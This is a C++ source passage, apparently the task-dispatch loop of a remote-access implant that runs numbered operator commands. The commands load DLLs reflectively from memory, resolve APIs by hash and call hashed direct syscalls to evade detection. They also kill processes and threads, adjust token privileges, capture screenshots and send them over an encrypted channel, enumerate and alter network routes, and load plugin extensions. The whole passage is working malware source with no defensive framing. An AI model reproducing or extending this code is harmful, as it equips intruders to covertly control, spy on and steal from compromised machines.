		auto hdll = MemoryLoadLibrary((PVOID)dll_ptr, dll_size);
		if (hdll->initialized == TRUE) {
			bResult = 1;
			AcquireSRWLockExclusive(&gSRWLock);
			mapdll_list.push_back(hdll);
			ReleaseSRWLockExclusive(&gSRWLock);
		}

		PACK_GLE_STATUS
			builder->add_long((LONGLONG)hdll->codeBase);
		STANDART_EPILOGUE
	}
	if (code == 96)
	{
		BOOL bResult = 0;
		LONGLONG dll_ptr = parser->get_long();
		AcquireSRWLockExclusive(&gSRWLock);
		for (int i = 0; i < mapdll_list.size(); i++) {
			if (mapdll_list.at(i)->codeBase == (VOID*)dll_ptr) {
				MemoryFreeLibrary(mapdll_list.at(i));
				mapdll_list.erase(mapdll_list.begin() + i);
				bResult = 1;
				break;
			}
		}
		ReleaseSRWLockExclusive(&gSRWLock);
		if (!bResult) SetLastError(ERROR_MOD_NOT_FOUND);
		PACK_GLE_STATUS
			builder->add_byte(bResult);

		STANDART_EPILOGUE
	}
	if (code == 97)
	{
		BOOL bResult = 0;
		LONGLONG dll_ptr = parser->get_long();
		DWORD32 name_hash = parser->get_int();
		LONGLONG fptr = (LONGLONG)MemoryGetProcAddressP((PUCHAR)dll_ptr, name_hash);
		if (fptr != NULL)
		{
			bResult = 1;
		}
		PACK_GLE_STATUS
			builder->add_long(fptr);
		STANDART_EPILOGUE
	}
	if (code == 100)
	{
		BOOL bResult = 0;
		DWORD32 hash = parser->get_int();
		int action_type = parser->get_int();
		LONGLONG result = 0;
		if (action_type == 0) {
			result = (LONGLONG)MemoryGetModuleHandle(hash);
		}
		else if (action_type == 1) {
			result = MemoryGetModuleSize(hash);
		}
		if (result) bResult = 1;

		PACK_GLE_STATUS
			builder->add_long(result);
		STANDART_EPILOGUE

	}
	if (code == 102)
	{
		BOOL bResult = 0;
		NTSTATUS status = 0;
		int hProcess = parser->get_int();
		NTSTATUS code = parser->get_int();
		status = psyslib->nt_call_2arg(HASH_NtTerminateProcess, (HANDLE)hProcess, (LPVOID)code);
		HANDLE_SYSCALL_RESULT
		PACK_NTSTATUS_STATUS
			builder->add_int(bResult);
		STANDART_EPILOGUE
	}
	if (code == 103)
	{
		BOOL bResult = 0;
		NTSTATUS status = 0;
		int hThread = parser->get_int();
		NTSTATUS code = parser->get_int();
		status = psyslib->nt_call_2arg(HASH_NtTerminateThread, (HANDLE)hThread, (LPVOID)code);
		HANDLE_SYSCALL_RESULT
			PACK_NTSTATUS_STATUS
			builder->add_int(bResult);
		STANDART_EPILOGUE
	}
	if (code == 244)
	{
		NTSTATUS status = 0;
		status = UserSyscallGate(parser, builder);
		STANDART_EPILOGUE
	}
	if (code == 245)
	{
		BOOL bResult = 0;
		INT64 size = parser->get_long();
		LPVOID memptr = HeapAlloc(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size);
		if (memptr) bResult = 1;
		PACK_GLE_STATUS
		builder->add_long((INT64)memptr);
		STANDART_EPILOGUE
	}
	if (code == 246)
	{
		BOOL bResult = 0;
		INT64 memptr = parser->get_long();
		bResult = HeapFree(NtCurrentPeb()->ProcessHeap, 0, (LPVOID)memptr);

		PACK_GLE_STATUS
			builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 34)
	{
		BOOL bResult = 0;
		DWORD32 hprocess = parser->get_int();
		LONGLONG dll_ptr = parser->get_long();
		DWORD32 name_hash = parser->get_int();
		LONGLONG fptr = (LONGLONG)GetRemoteProcAddress((HANDLE)hprocess, (HMODULE)dll_ptr, name_hash, NULL, NULL);
		if (fptr != NULL)
		{
			bResult = 1;
		}
		PACK_GLE_STATUS
			builder->add_long(fptr);
		STANDART_EPILOGUE
	}
	if (code == 35)
	{
		BOOL bResult = 0;
		DWORD32 hprocess = parser->get_int();
		DWORD32 name_hash = parser->get_int();
		LONGLONG fptr = (LONGLONG)GetRemoteModuleHandle((HANDLE)hprocess, name_hash);
		if (fptr != NULL)
		{
			bResult = 1;
		}
		PACK_GLE_STATUS
			builder->add_long(fptr);
		STANDART_EPILOGUE
	}
	if (code == 155) 
	{
		BOOL bResult = 0;
		INT64 hwnd = parser->get_long();
		DWORD quality = parser->get_int();
		HBITMAP hbitmap = 0;
		PBYTE pimage = 0;
		DWORD size = 0;
		SetProcessDPIAware();
		if (hwnd == NULL) hbitmap = CaptureFullScreen();
		else hbitmap = CaptureWindow((HWND)hwnd, TRUE);
		if (!hbitmap) { bResult = 0; PACK_GLE_STATUS; STANDART_EPILOGUE };

		bResult = BitmapToJpeg(hbitmap, quality, &pimage, &size);
		if (!bResult) { PACK_GLE_STATUS; STANDART_EPILOGUE };

		PACK_GLE_STATUS
		ctx->netio.send_encrypted_taskresponse_big(ctx, std::vector<UCHAR>(pimage, pimage + size), builder);

		HeapFree(NtCurrentPeb()->ProcessHeap, 0, pimage);
	}
	if (code == 156)
	{
		BOOL bResult = 0;
		DWORD pid = parser->get_int();
		HWND hwnd = FindWindowByPID(pid);
		if (hwnd)
		{
			bResult = 1;
		}
		PACK_GLE_STATUS
			builder->add_long((LONG64)hwnd);
		STANDART_EPILOGUE
	}
	if (code == 0)
	{
		BOOL bResult = 1;
		PACK_GLE_STATUS
			builder->add_byte((char)bResult);
		STANDART_EPILOGUE
	}
	if (code == 137) {
		DWORD handle = parser->get_int();
		DWORD state = parser->get_int();
		std::string privilege = parser->get_strarg();
		bool bResult = 0;
		TOKEN_PRIVILEGES tp;
		LUID luid;
		LookupPrivilegeValueA("", privilege.c_str(), &luid);
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = state;
		NTSTATUS status = psyslib->nt_call(HASH_NtAdjustPrivilegesToken,(HANDLE)handle, FALSE, &tp, sizeof(tp), 0, 0);
		HANDLE_SYSCALL_RESULT
			PACK_NTSTATUS_STATUS
			builder->add_int(bResult);
		STANDART_EPILOGUE
	}
	if (code == 138) {
		DWORD handle = parser->get_int();
		DWORD priv_count = parser->get_int();
		bool bResult = 0;
		NTSTATUS status = 0;
		LUID luid;
		std::vector<bool> result_array;
		for (int i = 0; i < priv_count; i++) {
			LUID luid = { 0,0 };
			std::string privilege_name = parser->get_strarg();
			LookupPrivilegeValueA("", privilege_name.c_str(), &luid);
			BOOL fResult = 0;
			PRIVILEGE_SET ps = {
				1,
				PRIVILEGE_SET_ALL_NECESSARY,
				luid
			};
			status = psyslib->nt_call_3arg(HASH_NtPrivilegeCheck, (HANDLE)handle, &ps, &fResult);
			HANDLE_SYSCALL_RESULT else bResult = 0;
			result_array.push_back(fResult);
		}
		PACK_NTSTATUS_STATUS
			builder->add_int(result_array.size());
			for (int i = 0; i < result_array.size(); i++) { builder->add_byte(result_array.at(i)); }
			STANDART_EPILOGUE
				result_array.~vector();
	}
	if (code == 59) {
		PIP_ADDR_STRING pAddrStr;
		PFIXED_INFO pFixedInfo;
		DWORD FixedInfoSize = 0;
		bool bResult = 0;
		DWORD Err = 0;
		if ((Err = GetNetworkParams(NULL, &FixedInfoSize)) != 0){ 
			if (Err != ERROR_BUFFER_OVERFLOW) {
				PACK_GLE_STATUS
				STANDART_EPILOGUE
				return 0;
			}
		}
		if ((pFixedInfo = (PFIXED_INFO)GlobalAlloc(GPTR, FixedInfoSize)) == NULL) {
			PACK_GLE_STATUS
			STANDART_EPILOGUE
			return 0;
		}
		if ((Err = GetNetworkParams(pFixedInfo, &FixedInfoSize)) == 0)
		{
			bResult = TRUE;
			PACK_GLE_STATUS
			builder->add_strarg(pFixedInfo->HostName);
			builder->add_strarg(pFixedInfo->DomainName);
			DWORD DnsServersCount = 1;
			pAddrStr = pFixedInfo->DnsServerList.Next;
			while (pAddrStr){
				DnsServersCount++;
				pAddrStr = pAddrStr->Next;
			}
			builder->add_int(DnsServersCount);
			builder->add_strarg(pFixedInfo->DnsServerList.IpAddress.String);
			pAddrStr = pFixedInfo->DnsServerList.Next;
			while (pAddrStr){
				builder->add_strarg(pAddrStr->IpAddress.String);
				pAddrStr = pAddrStr->Next;
			}
			builder->add_int(pFixedInfo->NodeType);
			builder->add_int(pFixedInfo->EnableRouting);
			builder->add_int(pFixedInfo->EnableProxy);
			builder->add_int(pFixedInfo->EnableDns);

			GlobalFree(pFixedInfo);
		}
		STANDART_EPILOGUE
	}
	if (code == 148) {
		bool bResult = 0;
		DWORD Err = 0;
		PIP_ADAPTER_INFO pAdapterInfo, pAdapt;
		PIP_ADDR_STRING pAddrStr;
		DWORD AdapterInfoSize = 0;
		DWORD AdapterInfoCount = 0;
		DWORD AdapterAddrInfoCount = 0;
		DWORD AdapterGatewayCount = 0;
		if ((Err = GetAdaptersInfo(NULL, &AdapterInfoSize)) != 0)
		{
			if (Err != ERROR_BUFFER_OVERFLOW)
			{
				PACK_GLE_STATUS
				STANDART_EPILOGUE
				return 0;
			}
		}
		if ((pAdapterInfo = (PIP_ADAPTER_INFO)GlobalAlloc(GPTR, AdapterInfoSize)) == NULL)
		{
			PACK_GLE_STATUS
			STANDART_EPILOGUE
			return 0;
		}
		if ((Err = GetAdaptersInfo(pAdapterInfo, &AdapterInfoSize)) != 0)
		{
			PACK_GLE_STATUS
			STANDART_EPILOGUE
			return 0;
		}

		bResult = TRUE;
		PACK_GLE_STATUS
		pAdapt = pAdapterInfo;
		while (pAdapt){
			AdapterInfoCount++;
			pAdapt = pAdapt->Next;
		}
		builder->add_int(AdapterInfoCount);
		pAdapt = pAdapterInfo;
		while (pAdapt)
		{
			builder->add_int(pAdapt->Type);
			builder->add_strarg(pAdapt->AdapterName);
			builder->add_strarg(pAdapt->Description);
			std::string str_address;
			for (int i = 0; i < pAdapt->AddressLength; i++)
			{
				char temp_char[3];
				sprintf_s(temp_char, "%.2x", pAdapt->Address[i]);
				if (i == (pAdapt->AddressLength - 1)) {
					str_address += temp_char;
				}
				else {
					str_address += temp_char;
					str_address += "-";
				}
			}
			builder->add_strarg(str_address);
			builder->add_int(pAdapt->DhcpEnabled);

			pAddrStr = &(pAdapt->IpAddressList);
			while (pAddrStr)
			{
				AdapterAddrInfoCount++;
				pAddrStr = pAddrStr->Next;
			}
			builder->add_int(AdapterAddrInfoCount);
			pAddrStr = &(pAdapt->IpAddressList);
			while (pAddrStr)
			{
				builder->add_strarg(pAddrStr->IpAddress.String);
				builder->add_strarg(pAddrStr->IpMask.String);
				pAddrStr = pAddrStr->Next;
			}
			AdapterGatewayCount = 1;
			pAddrStr = pAdapt->GatewayList.Next;
			while (pAddrStr)
			{
				AdapterGatewayCount++;
				pAddrStr = pAddrStr->Next;
			}
			builder->add_int(AdapterGatewayCount);
			builder->add_strarg(pAdapt->GatewayList.IpAddress.String);
			pAddrStr = pAdapt->GatewayList.Next;
			while (pAddrStr)
			{
				builder->add_strarg(pAddrStr->IpAddress.String);
				pAddrStr = pAddrStr->Next;
			}

			builder->add_strarg(pAdapt->DhcpServer.IpAddress.String);
			pAdapt = pAdapt->Next;

			AdapterInfoCount = 0;
			AdapterAddrInfoCount = 0;
			AdapterGatewayCount = 0;
		}
		GlobalFree(pAdapterInfo);
		STANDART_EPILOGUE
	}
	if (code == 68) {
		BOOL bResult = 0;
		DWORD family = parser->get_int();
		PMIB_IPFORWARD_TABLE2 pTable = 0;
		NTSTATUS status = GetIpForwardTable2(family, &pTable);
		if (status != NULL) {
			PACK_GLE_STATUS
			STANDART_EPILOGUE
			return 0;
		}
		bResult = TRUE;
		PACK_GLE_STATUS
		builder->add_int(pTable->NumEntries);
		for (int i = 0; i < pTable->NumEntries; i++)
		{
			MIB_IPFORWARD_ROW2* row = &pTable->Table[i];
			MIB_IPINTERFACE_ROW iface_row = { 0 };
			if (row->DestinationPrefix.Prefix.si_family == family)
			{
				IN_ADDR netmask;
				ConvertLengthToIpv4Mask(row->DestinationPrefix.PrefixLength, &netmask.S_un.S_addr);
				builder->add_strarg(_inet_ntoa((char*)&row->DestinationPrefix.Prefix.Ipv4.sin_addr));
				builder->add_strarg(_inet_ntoa((char*)&netmask));
				builder->add_strarg(_inet_ntoa((char*)&row->NextHop.Ipv4.sin_addr));
				builder->add_strarg(lookup_iface_addr(row->InterfaceIndex));
				builder->add_int(row->InterfaceIndex);

				iface_row.InterfaceIndex = row->InterfaceIndex;
				iface_row.Family = family;
				GetIpInterfaceEntry(&iface_row);

				builder->add_int(row->Metric + iface_row.Metric);
				builder->add_int(row->Origin);
			}
		}
		STANDART_EPILOGUE
	}
	if (code == 81) {
		BOOL bResult = FALSE;
		DWORD status = 0;
		DWORD action = parser->get_int();
		DWORD family = parser->get_int();
		std::string dest_addr = parser->get_strarg();
		std::string gateway_addr = parser->get_strarg();
		std::string netmask = parser->get_strarg();
		DWORD iface_idx = parser->get_int();
		DWORD metric = parser->get_int();

		MIB_IPFORWARD_ROW2 new_row = { 0 };
		InitializeIpForwardEntry(&new_row);
		new_row.ValidLifetime = WSA_INFINITE;
		new_row.PreferredLifetime = WSA_INFINITE;
		new_row.Protocol = MIB_IPPROTO_NETMGMT;
		UINT8 mask_length;
		ULONG unconverted_mask_length;
		new_row.Metric = metric;
		new_row.DestinationPrefix.Prefix.si_family = family;
		new_row.NextHop.si_family = family;
		new_row.Loopback = FALSE;
		new_row.AutoconfigureAddress = FALSE;
		new_row.Immortal = FALSE;
		new_row.Age = NULL;
		new_row.Origin = NlroManual;

		inet_pton(family, netmask.c_str(), &unconverted_mask_length);
		inet_pton(family, dest_addr.c_str(), &new_row.DestinationPrefix.Prefix.Ipv4.sin_addr.S_un.S_addr);
		inet_pton(family, gateway_addr.c_str(), &new_row.NextHop.Ipv4.sin_addr.S_un.S_addr);
		ConvertIpv4MaskToLength(unconverted_mask_length, &mask_length);
		new_row.DestinationPrefix.PrefixLength = mask_length;
		new_row.InterfaceIndex = iface_idx;
		if (action == 0) status = CreateIpForwardEntry2(&new_row);
		if (action == 1) status = DeleteIpForwardEntry2(&new_row);
		if (status == NULL) bResult = TRUE;

		PACK_NTSTATUS_STATUS
		builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 67) {
		LONGLONG ext_init_proc = 0;
		PEXTENSION_OBJECT ext_obj = 0;

		BOOL bResult = 0;
		LONGLONG ext_base = parser->get_long();
		
		PMEMORYMODULE ext_module = NULL;
		AcquireSRWLockShared(&gSRWLock);
		for (int i = 0; i < mapdll_list.size(); i++)
		{
			if ((LONGLONG)(mapdll_list.at(i)->codeBase) == ext_base) {
				ext_module = mapdll_list.at(i);
				break;
			}
		}
		ReleaseSRWLockShared(&gSRWLock);
		if (ext_module == 0){
			bResult = 0;
			SetLastError(ERROR_MOD_NOT_FOUND);
			goto FINISH_EXT_REG_REQUEST;
		}
		ext_init_proc = (LONGLONG)MemoryGetProcAddress(ext_module, HASH_RegisterExt);
		if (ext_init_proc == NULL)
		{
			bResult = 0;
			SetLastError(ERROR_PROC_NOT_FOUND);
			goto FINISH_EXT_REG_REQUEST;
		}
		ext_obj = new EXTENSION_OBJECT;
		ext_obj->ext_base = (LONGLONG)ext_module->codeBase;
		
		((NTSTATUS(*)(PMODULE_CONTEXT, PEXTENSION_OBJECT))ext_init_proc)(ctx, ext_obj);

		for (int i = 0; i < extension_list.size(); i++) {
			if (extension_list[i]->ext_uid == ext_obj->ext_uid) {
				SetLastError(ERROR_OBJECT_ALREADY_EXISTS);
				bResult = 0;
				goto FINISH_EXT_REG_REQUEST;
			}
		}

		extension_list.push_back(ext_obj);
		bResult = 1;
FINISH_EXT_REG_REQUEST:
		PACK_GLE_STATUS
			if (bResult) builder->add_long(ext_obj->ext_uid);
			else builder->add_long(NULL);
		STANDART_EPILOGUE
	}
	if (code == 72) {
		bool bResult = 0;
		DWORD ext_count = extension_list.size();
		bResult = 1;

		PACK_GLE_STATUS
		builder->add_int(ext_count);
		for (int i = 0; i < ext_count; i++){
			builder->add_long(extension_list[i]->ext_uid);
			builder->add_long(extension_list[i]->ext_base);
		}
		STANDART_EPILOGUE
	}
	if (code == 73) {
		bool bResult = 0;
		LONGLONG ext_uid = parser->get_long();
		AcquireSRWLockExclusive(&gSRWLock);
		for (int i = 0; i < extension_list.size(); i++) {
			if (extension_list[i]->ext_uid == ext_uid) {
				extension_list.erase(extension_list.begin() + i);
				bResult = 1;
				break;
			}
		}
		ReleaseSRWLockExclusive(&gSRWLock);
		if (!bResult) SetLastError(ERROR_MOD_NOT_FOUND);

		PACK_GLE_STATUS
			builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 78) {
		bool bResult = 0;
		LONGLONG ext_uid = parser->get_long();
		LONGLONG proc_uid = parser->get_long();
		EXTENSION_OBJECT *ext_module = NULL;
		NTSTATUS ext_proc_status = 0;
		LONGLONG ext_proc_ptr = 0;
		AcquireSRWLockShared(&gSRWLock);
		for (int i = 0; i < extension_list.size(); i++) {
			if (extension_list[i]->ext_uid == ext_uid) {
				bResult = 1;
				ext_module = extension_list[i];
				break;
			}
		}
		if (ext_module == NULL){
			bResult = 0;
			SetLastError(ERROR_MOD_NOT_FOUND);
			goto FINISH_EXT_API_EXECUTION;
		}
		for (int i = 0; i < ext_module->api_table.size(); i++)
		{
			if (ext_module->api_table[i].api_uid == proc_uid)
			{
				bResult = 1;
				ext_proc_ptr = ext_module->api_table[i].api_ptr;
				break;
			}
		}
		if (ext_proc_ptr == NULL){
			bResult = 0;
			SetLastError(ERROR_PROC_NOT_FOUND);
			goto FINISH_EXT_API_EXECUTION;
		}

FINISH_EXT_API_EXECUTION:
		ReleaseSRWLockShared(&gSRWLock);


		PACK_GLE_STATUS
			if (ext_proc_ptr) {
				try{
					AcquireSRWLockExclusive(&gSRWLock);
					ext_proc_status = ((NTSTATUS(*)(PMODULE_CONTEXT, CommandParser*, ResponseBuilder*))ext_proc_ptr)(ctx, parser, builder);
				}
				catch (std::exception&) {
					ext_proc_status = ERROR_EXCEPTION_IN_RESOURCE_CALL;
				}
			}
		ReleaseSRWLockExclusive(&gSRWLock);
		builder->add_long(ext_proc_status);
		STANDART_EPILOGUE
	}

	delete builder;
	delete parser;
	return 0;
}